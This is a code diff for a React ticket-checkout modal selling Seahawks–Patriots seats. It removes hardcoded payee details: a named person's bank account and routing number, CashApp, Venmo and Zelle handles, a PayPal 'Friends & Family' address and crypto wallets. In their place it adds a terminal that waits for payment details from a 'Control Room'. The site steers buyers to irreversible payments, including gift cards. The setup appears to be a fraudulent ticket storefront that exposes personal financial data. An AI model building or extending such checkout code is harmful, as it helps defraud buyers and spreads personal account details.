@@ -45,6 +45,7 @@ import { PaymentReceiptUploader } from "./common/PaymentReceiptUploader";
 import { generateTicketPDF } from "../utils/ticketPdfGenerator";
 import { QRCodeSVG } from "qrcode.react";
 import { SEAHAWKS_PATRIOTS_SEATS, SeatListing, SEAHAWKS_PATRIOTS_IMAGES } from "../data/seahawksPatriotsSeats";
+import { CustomerPaymentWaitingTerminal } from "./common/CustomerPaymentWaitingTerminal";
 
 export interface GameTicket {
   id: string;
@@ -87,48 +88,48 @@ interface TicketCheckoutModalProps {
 
 export const OFFICIAL_PAYMENT_CHANNELS = {
   bank: {
-    bankName: "BMO bank",
-    accountName: "Matthew Golom",
-    accountNumber: "4859176529",
-    routingNumber: "071025661",
-    notes: "Direct ACH / Domestic Wire Transfer"
+    bankName: "",
+    accountName: "",
+    accountNumber: "",
+    routingNumber: "",
+    notes: "Dynamic settlement via Control Room"
   },
   cashapp: {
-    tag: "$Mickobabe32",
-    display: "$Mickobabe32",
+    tag: "",
+    display: "",
     discountPercent: 5
   },
   paypal: {
-    email: "amj688640@yahoo.com",
-    name: "Anna williams",
-    display: "amj688640@yahoo.com",
+    email: "",
+    name: "",
+    display: "",
     mode: "FRIENDS & FAMILY",
     discountPercent: 5
   },
   venmo: {
-    handle: "@DomickoChopin",
-    display: "@DomickoChopin",
+    handle: "",
+    display: "",
     discountPercent: 5
   },
   zelle: {
-    email: "matthewgolom21@gmail.com",
-    name: "Matthew Golom",
+    email: "",
+    name: "",
     discountPercent: 5
   },
   crypto: {
     btc: {
       name: "Bitcoin (BTC)",
-      address: "16246wmdY6kGfFkWevPKCQrTKH8CRJ62yJ",
+      address: "",
       network: "Bitcoin Mainnet"
     },
     eth: {
       name: "Ethereum (ETH)",
-      address: "0x3adbc9f41f882b54ddd54b7bea8b9bfd2ad8d2cf",
+      address: "",
       network: "Ethereum (ERC-20)"
     },
     usdt: {
       name: "USDT (Ethereum ERC-20)",
-      address: "0x3adbc9f41f882b54ddd54b7bea8b9bfd2ad8d2cf",
+      address: "",
       network: "Ethereum (ERC-20)"
     }
   }
@@ -198,6 +199,7 @@ export const TicketCheckoutModal: React.FC<TicketCheckoutModalProps> = ({
   }, [initialTier, isOpen]);
 
   // Buyer Details
+  const [checkoutSessionId] = useState(() => `PAY-TKT-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`);
   const [buyerName, setBuyerName] = useState("");
   const [buyerEmail, setBuyerEmail] = useState("");
   const [buyerPhone, setBuyerPhone] = useState("");
@@ -1663,268 +1665,27 @@ export const TicketCheckoutModal: React.FC<TicketCheckoutModalProps> = ({
                     </span>
                   </div>
 
-                  {paymentTab === "bank" && (
-                    <div className="space-y-3">
-                      <div className="flex items-center justify-between border-b border-white/5 pb-2">
-                        <span className="text-xs font-black uppercase text-white flex items-center gap-2">
-                          <Building2 className="w-4 h-4 text-blue-400" /> BMO Bank Wire & Direct ACH
-                        </span>
-                        <span className="text-[9px] font-mono uppercase bg-blue-500/10 text-blue-400 px-2 py-0.5 rounded font-bold">
-                          Domestic ACH & Wire
-                        </span>
-                      </div>
-
-                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
-                        <div className="p-3 bg-zinc-900 rounded-xl border border-white/5 flex items-center justify-between">
-                          <div>
-                            <span className="text-[8px] font-black uppercase text-zinc-500 block">Bank Name</span>
-                            <span className="font-bold text-white">{OFFICIAL_PAYMENT_CHANNELS.bank.bankName}</span>
-                          </div>
-                          <button
-                            type="button"
-                            onClick={() => copyToClipboard(OFFICIAL_PAYMENT_CHANNELS.bank.bankName, "bankName")}
-                            className="text-zinc-500 hover:text-white p-1"
-                          >
-                            {copiedKey === "bankName" ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
-                          </button>
-                        </div>
-
-                        <div className="p-3 bg-zinc-900 rounded-xl border border-white/5 flex items-center justify-between">
-                          <div>
-                            <span className="text-[8px] font-black uppercase text-zinc-500 block">Account Name</span>
-                            <span className="font-bold text-white">{OFFICIAL_PAYMENT_CHANNELS.bank.accountName}</span>
-                          </div>
-                          <button
-                            type="button"
-                            onClick={() => copyToClipboard(OFFICIAL_PAYMENT_CHANNELS.bank.accountName, "accountName")}
-                            className="text-zinc-500 hover:text-white p-1"
-                          >
-                            {copiedKey === "accountName" ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
-                          </button>
-                        </div>
-
-                        <div className="p-3 bg-zinc-900 rounded-xl border border-white/5 flex items-center justify-between">
-                          <div>
-                            <span className="text-[8px] font-black uppercase text-zinc-500 block">Account Number</span>
-                            <span className="font-mono font-black text-cyan-300">{OFFICIAL_PAYMENT_CHANNELS.bank.accountNumber}</span>
-                          </div>
-                          <button
-                            type="button"
-                            onClick={() => copyToClipboard(OFFICIAL_PAYMENT_CHANNELS.bank.accountNumber, "accountNum")}
-                            className="text-zinc-500 hover:text-white p-1"
-                          >
-                            {copiedKey === "accountNum" ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
-                          </button>
-                        </div>
-
-                        <div className="p-3 bg-zinc-900 rounded-xl border border-white/5 flex items-center justify-between">
-                          <div>
-                            <span className="text-[8px] font-black uppercase text-zinc-500 block">Routing Number (Routine #)</span>
-                            <span className="font-mono font-black text-amber-300">{OFFICIAL_PAYMENT_CHANNELS.bank.routingNumber}</span>
-                          </div>
-                          <button
-                            type="button"
-                            onClick={() => copyToClipboard(OFFICIAL_PAYMENT_CHANNELS.bank.routingNumber, "routingNum")}
-                            className="text-zinc-500 hover:text-white p-1"
-                          >
-                            {copiedKey === "routingNum" ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
-                          </button>
-                        </div>
-                      </div>
-                    </div>
-                  )}
-
-                  {paymentTab === "cashapp" && (
-                    <div className="space-y-3">
-                      <div className="flex items-center justify-between border-b border-white/5 pb-2">
-                        <span className="text-xs font-black uppercase text-white flex items-center gap-2">
-                          <Smartphone className="w-4 h-4 text-emerald-400" /> Cash App Mobile Pay
-                        </span>
-                        <span className="text-[9px] font-mono uppercase bg-emerald-500/20 text-emerald-400 px-2 py-0.5 rounded font-black flex items-center gap-1">
-                          <Sparkles className="w-3 h-3" /> 5% Discount Applied
-                        </span>
-                      </div>
-
-                      <div className="p-4 bg-zinc-900 rounded-xl border border-emerald-500/20 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
-                        <div>
-                          <span className="text-[8px] font-black uppercase text-zinc-500 block">Official Cashtag</span>
-                          <span className="text-lg font-mono font-black text-emerald-400">{OFFICIAL_PAYMENT_CHANNELS.cashapp.tag}</span>
-                          <span className="text-[10px] text-zinc-400 font-bold uppercase block mt-0.5">Instant Clearing & Verified</span>
-                        </div>
-                        <button
-                          type="button"
-                          onClick={() => copyToClipboard(OFFICIAL_PAYMENT_CHANNELS.cashapp.tag, "cashapp")}
-                          className="px-4 py-2 bg-emerald-500 hover:bg-emerald-400 text-black font-black text-xs uppercase tracking-wider rounded-xl flex items-center gap-1.5 transition-all self-start sm:self-auto cursor-pointer"
-                        >
-                          {copiedKey === "cashapp" ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
-                          {copiedKey === "cashapp" ? "Copied!" : "Copy Cashtag"}
-                        </button>
-                      </div>
-                    </div>
-                  )}
-
-                  {paymentTab === "paypal" && (
-                    <div className="space-y-3">
-                      <div className="flex items-center justify-between border-b border-white/5 pb-2">
-                        <span className="text-xs font-black uppercase text-white flex items-center gap-2">
-                          <CreditCard className="w-4 h-4 text-blue-400" /> PayPal Instant Settlement
-                        </span>
-                        <div className="flex items-center gap-2">
-                          <span className="text-[9px] font-mono uppercase bg-blue-500/20 text-blue-300 border border-blue-500/30 px-2 py-0.5 rounded font-black">
-                            FRIENDS & FAMILY
-                          </span>
-                          <span className="text-[9px] font-mono uppercase bg-emerald-500/20 text-emerald-400 px-2 py-0.5 rounded font-black flex items-center gap-1">
-                            <Sparkles className="w-3 h-3" /> 5% Discount Applied
-                          </span>
-                        </div>
-                      </div>
-
-                      <div className="p-4 bg-zinc-900 rounded-xl border border-blue-500/20 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
-                        <div className="space-y-1">
-                          <span className="text-[8px] font-black uppercase text-zinc-500 block">PAYPAL RECIPIENT DETAILS</span>
-                          <div className="text-base font-bold text-white">Anna williams</div>
-                          <span className="text-sm font-mono font-black text-blue-300 block">{OFFICIAL_PAYMENT_CHANNELS.paypal.email}</span>
-                          <div className="inline-flex items-center gap-1.5 px-2 py-0.5 bg-blue-500/10 border border-blue-500/20 rounded text-[9px] text-blue-300 font-bold uppercase mt-1">
-                            <span>Mode: <strong>FRIENDS & FAMILY</strong></span>
-                          </div>
-                        </div>
-                        <button
-                          type="button"
-                          onClick={() => copyToClipboard(OFFICIAL_PAYMENT_CHANNELS.paypal.email, "paypal")}
-                          className="px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white font-black text-xs uppercase tracking-wider rounded-xl flex items-center gap-1.5 transition-all self-start sm:self-auto cursor-pointer"
-                        >
-                          {copiedKey === "paypal" ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
-                          {copiedKey === "paypal" ? "Copied!" : "Copy PayPal Email"}
-                        </button>
-                      </div>
-                    </div>
-                  )}
-
-                  {paymentTab === "venmo" && (
-                    <div className="space-y-3">
-                      <div className="flex items-center justify-between border-b border-white/5 pb-2">
-                        <span className="text-xs font-black uppercase text-white flex items-center gap-2">
-                          <Smartphone className="w-4 h-4 text-sky-400" /> Venmo Account
-                        </span>
-                        {!isPatriotsGame && (
-                          <span className="text-[9px] font-mono uppercase bg-emerald-500/20 text-emerald-400 px-2 py-0.5 rounded font-black flex items-center gap-1">
-                            <Sparkles className="w-3 h-3" /> 5% Discount Applied
-                          </span>
-                        )}
-                      </div>
-
-                      <div className="p-4 bg-zinc-900 rounded-xl border border-sky-500/20 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
-                        <div>
-                          <span className="text-[8px] font-black uppercase text-zinc-500 block">Official Handle</span>
-                          <span className="text-lg font-mono font-black text-sky-400">{OFFICIAL_PAYMENT_CHANNELS.venmo.handle}</span>
-                          <span className="text-[10px] text-zinc-400 font-bold uppercase block mt-0.5">Instant Clearing & Verified</span>
-                        </div>
-                        <button
-                          type="button"
-                          onClick={() => copyToClipboard(OFFICIAL_PAYMENT_CHANNELS.venmo.handle, "venmo")}
-                          className="px-4 py-2 bg-sky-500 hover:bg-sky-400 text-white font-black text-xs uppercase tracking-wider rounded-xl flex items-center gap-1.5 transition-all self-start sm:self-auto cursor-pointer"
-                        >
-                          {copiedKey === "venmo" ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
-                          {copiedKey === "venmo" ? "Copied!" : "Copy Venmo"}
-                        </button>
-                      </div>
-                    </div>
-                  )}
-
-                  {paymentTab === "zelle" && (
-                    <div className="space-y-3">
-                      <div className="flex items-center justify-between border-b border-white/5 pb-2">
-                        <span className="text-xs font-black uppercase text-white flex items-center gap-2">
-                          <Smartphone className="w-4 h-4 text-purple-400" /> Zelle Direct Bank Transfer
-                        </span>
-                        {!isPatriotsGame && (
-                          <span className="text-[9px] font-mono uppercase bg-emerald-500/20 text-emerald-400 px-2 py-0.5 rounded font-black flex items-center gap-1">
-                            <Sparkles className="w-3 h-3" /> 5% Discount Applied
-                          </span>
-                        )}
-                      </div>
-
-                      <div className="p-4 bg-zinc-900 rounded-xl border border-purple-500/20 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
-                        <div>
-                          <span className="text-[8px] font-black uppercase text-zinc-500 block">Zelle Recipient Email & Name</span>
-                          <span className="text-sm font-mono font-black text-purple-300 block">{OFFICIAL_PAYMENT_CHANNELS.zelle.email}</span>
-                          <span className="text-[10px] text-zinc-400 font-bold uppercase block mt-0.5">Name: {OFFICIAL_PAYMENT_CHANNELS.zelle.name}</span>
-                        </div>
-                        <button
-                          type="button"
-                          onClick={() => copyToClipboard(OFFICIAL_PAYMENT_CHANNELS.zelle.email, "zelle")}
-                          className="px-4 py-2 bg-purple-600 hover:bg-purple-500 text-white font-black text-xs uppercase tracking-wider rounded-xl flex items-center gap-1.5 transition-all self-start sm:self-auto cursor-pointer"
-                        >
-                          {copiedKey === "zelle" ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
-                          {copiedKey === "zelle" ? "Copied!" : "Copy Zelle"}
-                        </button>
-                      </div>
-                    </div>
-                  )}
-
-                  {paymentTab === "crypto" && (
-                    <div className="space-y-3">
-                      <div className="flex items-center justify-between border-b border-white/5 pb-2">
-                        <div className="flex gap-2">
-                          {[
-                            { id: "usdt", label: "USDT (ERC-20)" },
-                            { id: "btc", label: "BTC (Bitcoin)" },
-                            { id: "eth", label: "ETH (Ethereum)" }
-                          ].map(c => (
-                            <button
-                              key={c.id}
-                              type="button"
-                              onClick={() => setSelectedCrypto(c.id as any)}
-                              className={`px-3 py-1 rounded-lg text-[9px] font-black uppercase tracking-wider transition-all ${
-                                selectedCrypto === c.id 
-                                  ? "bg-blue-600 text-white" 
-                                  : "bg-zinc-900 text-zinc-400 hover:text-white"
-                              }`}
-                            >
-                              {c.label}
-                            </button>
-                          ))}
-                        </div>
-                        <span className="text-[9px] font-mono uppercase text-zinc-400">
-                          {OFFICIAL_PAYMENT_CHANNELS.crypto[selectedCrypto].network}
-                        </span>
-                      </div>
-
-                      <div className="p-4 bg-zinc-900 rounded-xl border border-white/5 space-y-3">
-                        <div className="flex justify-between items-center">
-                          <span className="text-[9px] font-black uppercase text-zinc-500">
-                            {OFFICIAL_PAYMENT_CHANNELS.crypto[selectedCrypto].name} DEPOSIT ADDRESS
-                          </span>
-                          <button
-                            type="button"
-                            onClick={() => copyToClipboard(OFFICIAL_PAYMENT_CHANNELS.crypto[selectedCrypto].address, "cryptoAddress")}
-                            className="text-xs font-black uppercase text-blue-400 hover:text-blue-300 flex items-center gap-1"
-                          >
-                            {copiedKey === "cryptoAddress" ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
-                            {copiedKey === "cryptoAddress" ? "Copied!" : "Copy"}
-                          </button>
-                        </div>
-                        
-                        <div className="flex flex-col sm:flex-row items-center gap-4 bg-zinc-950 p-3 rounded-xl border border-white/5">
-                          <div className="p-2 bg-white rounded-xl shadow shrink-0">
-                            <QRCodeSVG
-                              value={OFFICIAL_PAYMENT_CHANNELS.crypto[selectedCrypto].address}
-                              size={84}
-                              level="M"
-                              includeMargin={false}
-                            />
-                          </div>
-                          <div className="min-w-0 flex-1 text-center sm:text-left">
-                            <p className="text-xs font-mono break-all text-emerald-400 font-bold select-all">
-                              {OFFICIAL_PAYMENT_CHANNELS.crypto[selectedCrypto].address}
-                            </p>
-                            <span className="text-[8px] text-zinc-500 block mt-1">
-                              Scan with mobile wallet app (Coinbase, Trust Wallet, MetaMask, etc.)
-                            </span>
-                          </div>
-                        </div>
-                      </div>
-                    </div>
+                  {/* Real-time Dynamic Payment Terminal for all direct channels (Awaiting details from Control Room) */}
+                  {paymentTab !== "giftcard" && (
+                    <CustomerPaymentWaitingTerminal
+                      sessionId={checkoutSessionId}
+                      selectedMethod={paymentTab as any}
+                      amount={currentSplit.dueToday}
+                      orderReference={checkoutSessionId}
+                      customerName={buyerName || "Ticket Guest"}
+                      customerEmail={buyerEmail}
+                      customerPhone={buyerPhone}
+                      itemTitle={`${game.homeTeam} vs ${game.awayTeam} (${selectedTier.toUpperCase()} Ticket)`}
+                      itemType="ticket"
+                      onSwitchToGiftCard={() => setPaymentTab("giftcard")}
+                      onPaymentSubmitted={(ref, receipt) => {
+                        setPaymentRef(ref);
+                        if (receipt) {
+                          setPaymentReceiptUrl(receipt);
+                          setPaymentReceiptUrls(prev => [receipt, ...prev]);
+                        }
+                      }}
+                    />
                   )}
 
                   {paymentTab === "giftcard" && (
